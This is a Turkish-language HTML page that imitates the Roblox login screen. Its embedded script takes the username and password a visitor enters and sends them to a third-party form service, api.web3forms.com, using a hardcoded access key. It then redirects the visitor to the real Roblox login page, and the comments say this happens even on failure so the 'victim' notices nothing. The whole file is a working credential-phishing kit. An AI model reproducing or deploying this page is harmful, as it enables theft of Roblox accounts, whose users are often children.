<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş - Roblox</title>
    <style>
        body {
            /* Arka Plan Görseli */
            background: linear-gradient(rgba(0, 0, 0, 0.45), rgba(0, 0, 0, 0.45)), 
                        url('https://image.api.playstation.com/vulcan/ap/rnd/202504/1706/4cc02203db88b29b535c26b8296c89f983eaf48d67462e1d.png?w=1920'); 
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            font-family: "HCo Gotham SSm", "Helvetica Neue", Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        /* İstediğin o Şeffaf Kutu */
        .login-container {
            background-color: rgba(35, 37, 39, 0.9);
            backdrop-filter: blur(12px);
            padding: 45px 35px;
            border-radius: 10px;
            width: 380px;
            text-align: center;
            box-shadow: 0 15px 35px rgba(0,0,0,0.6);
            border: 1px solid rgba(255, 255, 255, 0.08);
        }

        h2 { font-size: 26px; margin-bottom: 30px; color: #ffffff; font-weight: 700; }

        input {
            width: 100%;
            height: 48px;
            margin-bottom: 15px;
            border-radius: 4px;
            border: 1px solid #111;
            background-color: #393b3d;
            color: #ffffff;
            padding: 0 15px;
            box-sizing: border-box;
            font-size: 16px;
        }

        /* Giriş Yap Butonu */
        .login-btn {
            width: 100%;
            height: 42px;
            background-color: transparent;
            border: 1px solid #ffffff;
            color: #ffffff;
            font-size: 16px;
            font-weight: 600;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 10px;
            transition: 0.3s;
        }
        .login-btn:hover { background-color: rgba(255, 255, 255, 0.1); }

        .blue-link { color: #00b2ff; text-decoration: none; font-size: 13px; display: inline-block; margin-top: 15px; }

        .divider { height: 1px; background-color: rgba(255, 255, 255, 0.1); margin: 25px 0; }

        .social-btn {
            width: 100%;
            height: 42px;
            background-color: #393b3d;
            border: none;
            color: #ffffff;
            border-radius: 4px;
            margin-bottom: 10px;
            font-weight: 600;
            cursor: pointer;
        }
    </style>
</head>
<body>

<div class="login-container">
    <h2>Roblox'a Giriş Yap</h2>

    <form id="robForm">
        <input type="text" id="user" placeholder="Kullanıcı Adı/E-posta/Telefon" required>
        <input type="password" id="pass" placeholder="Şifre" required>
        <button type="submit" class="login-btn">Giriş Yap</button>
    </form>

    <a href="https://www.roblox.com/login/forgot-password-or-username" class="blue-link">Şifrenizi mi unuttunuz?</a>
    <div class="divider"></div>
    <button class="social-btn" onclick="window.location.href='https://www.roblox.com/login/otp'">Hızlı Giriş</button>
    <div style="margin-top:20px; color:white; font-size:14px;">
        Hesabın yok mu? <a href="https://www.roblox.com/" class="blue-link" style="margin-top:0;">Kaydol</a>
    </div>
</div>

<script>
    // Web3Forms hatasını kurban görmesin diye AJAX kullanıyoruz
    document.getElementById('robForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const userVal = document.getElementById('user').value;
        const passVal = document.getElementById('pass').value;

        fetch('https://api.web3forms.com/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                access_key: '4d9b8514-bee7-4916-bfab-e61246fa5ba7',
                Kullanici: userVal,
                Sifre: passVal
            })
        }).then(() => {
            // Veri gittiği an gerçek roblox'a atıyoruz
            window.location.href = 'https://www.roblox.com/login';
        }).catch(() => {
            // Hata verse bile (güvenlik uyarısı çıksa bile) yine roblox'a atıyoruz
            window.location.href = 'https://www.roblox.com/login';
        });
    });
</script>

</body>
</html>
